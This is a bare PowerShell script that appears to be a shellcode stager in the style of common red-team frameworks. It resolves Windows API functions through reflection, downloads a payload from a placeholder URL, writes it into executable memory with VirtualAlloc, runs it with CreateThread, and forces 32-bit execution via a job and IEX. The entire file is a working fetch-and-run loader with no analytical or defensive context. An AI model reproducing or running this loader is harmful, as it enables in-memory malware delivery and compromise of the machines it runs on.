Set-StrictMode -Version 2

$var1 = @'
function var2 {
        Param ($var_module, $var_procedure)
        $var3 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $var3.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var3.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function var4 {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var7,
                [Parameter(Position = 1)] [Type] $var5 = [Void]
        )

        $var6 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $var6.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var7).SetImplementationFlags('Runtime, Managed')
        $var6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var5, $var7).SetImplementationFlags('Runtime, Managed')
        return $var6.CreateType()
}

[Byte[]]$var8 = (New-Object System.Net.WebClient).DownloadData("[URL]")

$var9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((var2 kernel32.dll VirtualAlloc), (var4 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var8.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var8, 0, $var9, $var8.length)

$var10 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((var2 kernel32.dll CreateThread), (var4 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$var9,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((var2 kernel32.dll WaitForSingleObject), (var4 @([IntPtr], [Int32]))).Invoke($var10,0xffffffff) | Out-Null
'@

If ([IntPtr]::size -eq 8) {
        start-job { param($var11) IEX $var11 } -RunAs32 -Argument $var1 | wait-job | Receive-Job
}
else {
        IEX $var1
}